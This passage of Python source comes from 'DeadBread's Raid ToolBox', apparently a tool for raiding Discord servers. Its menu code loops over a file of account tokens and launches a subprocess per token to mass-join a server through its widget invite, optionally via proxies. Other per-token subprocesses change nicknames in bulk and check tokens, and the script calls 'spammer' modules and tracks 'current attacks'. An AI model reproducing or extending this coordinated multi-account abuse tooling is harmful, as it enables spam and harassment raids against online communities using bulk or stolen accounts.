                    p = subprocess.Popen([linuxpy,'tools/cleaner.py',token,choice],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
            time.sleep(3)
            tools(currentattacks,spawnedpids)
        else:
            tools(currentattacks,spawnedpids)
    elif int(choice) == 4:
        clear()
        if sys.platform.startswith('win32'):
            ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Quick Checker")
        elif sys.platform.startswith('linux'):
            sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Quick Checker\x07")
        tokenlist = open("tokens.txt").read().splitlines()
        for token in tokenlist:
            if sys.platform.startswith('win32'):
                p = subprocess.Popen([winpy,'tools/quickchecker.py',token])
                time.sleep(0.07)
            elif sys.platform.startswith('linux'):
                p = subprocess.Popen([linuxpy,'tools/quickchecker.py',token])
                time.sleep(0.07)
        p.wait()
        input("Checking complete.")
        tools(currentattacks,spawnedpids)
    elif int(choice) == 5:
        clear()
        if sys.platform.startswith('win32'):
            ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Nickname Changer")
        elif sys.platform.startswith('linux'):
            sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Nickname Changer\x07")
        print (colored("Server Nickname Changer",menucolour))
        print (colored("0: Back",menucolour))
        SERVER = input("Server ID: ")
        if SERVER == "0":
            tools(currentattacks,spawnedpids)
        nick = input("New Nickname: ")
        tokenlist = open("tokens.txt").read().splitlines()
        for token in tokenlist:
            if sys.platform.startswith('win32'):
                p = subprocess.Popen([winpy,'tools/changenickname.py',token,SERVER,nick],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
            elif sys.platform.startswith('linux'):
                p = subprocess.Popen([linuxpy,'tools/changenickname.py',token,SERVER,nick],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        time.sleep(5)
        tools(currentattacks,spawnedpids)
    elif int(choice) == 6:
        clear()
        if sys.platform.startswith('win32'):
            ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Widget Joiner")
        elif sys.platform.startswith('linux'):
            sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Widget Joiner\x07")
        print (colored("Server Widget Joiner (Only Works on servers that have widget enabled.)",menucolour))
        print (colored("0: Back",menucolour))
        SERVER = input("Server ID: ")
        if SERVER == "0":
            tools(currentattacks,spawnedpids)
        src = requests.get("https://discordapp.com/api/guilds/{}/widget.json".format(SERVER)).text
        if "is not snowflake." in str(src):
            print("{} is not a server ID.".format(SERVER))
            input()
            tools(currentattacks, spawnedpids)
        elif "Widget Disabled" in str(src):
            print("Widget is disabled in this server.")
            input()
            tools(currentattacks, spawnedpids)
        else:
            split = src.split('"') # ghetto way to do it but fuck it i don't care
            for string in split:
                if "https://discordapp.com/invite/" in string:
                    print("Invite: {}".format(string))
                    invite = string[30:]
                    break
            tokenlist = open("tokens.txt").read().splitlines()
            for token in tokenlist:
                if sys.platform.startswith('win32'):
                    p = subprocess.Popen([winpy,'spammer/joiner.py',token,invite,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
                elif sys.platform.startswith('linux'):
                    p = subprocess.Popen([linuxpy,'spammer/joiner.py',token,invite,useproxies],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
            time.sleep(1)
            tools(currentattacks, spawnedpids)

def wew(currentattacks,spawnedpids):
    if sys.platform.startswith('win32'):
        clear()
        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | ¯\_(ツ)_/¯")
    else:
        main(currentattacks,spawnedpids)
    p = subprocess.Popen([winpy,'spammer/player.py',winpy],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
    currentattacks.append("Music!")
    spawnedpids.append(p.pid)
    main(currentattacks,spawnedpids)

def aaa():
    clear()
    def asciigen(length):
        asc = ''
        for x in range(int(length)):
            num = random.randrange(13000)
            asc = asc + chr(num)
        return asc
    colours = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'grey', 'white']
    while True:
        try:
            if sys.platform.startswith('win32'):
                ctypes.windll.kernel32.SetConsoleTitleW("{}".format(asciigen(random.randint(51,101))))
            elif sys.platform.startswith('linux'):
                sys.stdout.write("\x1b]2;{}\x07".format(asciigen(random.randint(1,21))))
        except Exception:
            if sys.platform.startswith('win32'):
                os.system('mode con:cols=100 lines=30')
            elif sys.platform.startswith('linux'):
                os.system("printf '\033[8;30;100t'")
            clear()
            a = ""
            for x in range(100):
                a += "A"
            for x in range(30):
                print(colored(a,random.choice(colours)))
            time.sleep(1)
            aaa()
        text = ''
        for x in range(9999):
            text += colored(asciigen(1), random.choice(colours))
        print(text)

main(currentattacks,spawnedpids)
